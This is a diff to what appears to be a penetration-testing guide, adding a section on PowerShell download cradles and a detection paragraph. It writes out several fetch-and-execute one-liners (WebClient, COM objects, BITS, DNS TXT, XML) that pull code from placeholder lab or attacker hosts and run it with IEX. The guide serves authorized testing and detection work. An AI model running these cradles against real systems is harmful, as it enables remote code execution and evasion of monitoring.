@@ -70,6 +70,84 @@ IEX (New-Object Net.WebClient).DownloadString('http://ATTACK_IP:8000/script.ps1'
 
 This avoids saving the script itself but is not invisible: network, PowerShell, AMSI, and process telemetry may still record it.
 
+### PowerShell download cradles
+
+A **download cradle** is a short command that retrieves remote content and immediately executes or loads it. It is convenient in a controlled lab, but it combines two high-risk operations: trusting remote content and executing it without a normal review step. Prefer downloading to a file, checking the source and hash, and executing separately.
+
+WebClient:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://LAB_SERVER/script.ps1')
+```
+
+PowerShell 3.0 and later:
+
+```powershell
+IEX (Invoke-WebRequest 'http://LAB_SERVER/script.ps1' -UseBasicParsing).Content
+```
+
+Legacy Internet Explorer COM automation:
+
+```powershell
+$ie = New-Object -ComObject InternetExplorer.Application
+$ie.Visible = $false
+$ie.Navigate('http://LAB_SERVER/script.ps1')
+Start-Sleep -Seconds 5
+$r = $ie.Document.body.innerHTML
+$ie.Quit()
+IEX $r
+```
+
+MSXML COM object:
+
+```powershell
+$h = New-Object -ComObject Msxml2.XMLHTTP
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+```
+
+WinHTTP COM object:
+
+```powershell
+$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+$h.Open('GET','http://LAB_SERVER/script.ps1',$false)
+$h.Send()
+IEX $h.ResponseText
+```
+
+WinHTTP uses its own proxy configuration and may not automatically use the interactive user's browser proxy settings.
+
+BITS transfer, which writes a temporary file to disk:
+
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer 'http://LAB_SERVER/script.ps1' "$env:TEMP\transfer.tmp"
+$r = Get-Content "$env:TEMP\transfer.tmp" -Raw
+Remove-Item "$env:TEMP\transfer.tmp"
+IEX $r
+```
+
+DNS TXT-record transport:
+
+```powershell
+$txt = (Resolve-DnsName -Type TXT payload.lab.example).Strings -join ''
+$code = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($txt))
+IEX $code
+```
+
+The TXT record must contain the expected Base64 text. DNS size limits may require chunking, and DNS logs can reveal the queries. Base64 provides no confidentiality or authenticity.
+
+XML-hosted command content:
+
+```powershell
+$xml = New-Object System.Xml.XmlDocument
+$xml.Load('https://LAB_SERVER/command.xml')
+$xml.command.a.execute | IEX
+```
+
+Treat every remote response as untrusted input. A changed server response, DNS record, proxy response, or XML document changes what is executed. In authorized exercises, pin the source, use TLS, validate content, and keep a copy for evidence.
+
 ### Invoke-WebRequest and Invoke-RestMethod
 
 ```powershell
@@ -452,6 +530,8 @@ HTTP clients expose characteristic request patterns and user-agent strings:
 | MSXML COM | Legacy Internet Explorer/Trident-like user agent |
 | Certutil | `Microsoft-CryptoAPI/<version>` |
 | BITS | `Microsoft BITS/<version>` and an initial `HEAD` request |
+
+Download-cradle detection should also look for `Invoke-Expression`/`IEX` receiving network-derived data, PowerShell creating browser or HTTP COM objects, BITS jobs followed by reads and deletion, unusual DNS TXT lookups, and XML documents whose values flow into execution.
 
 Defenders should correlate:
 
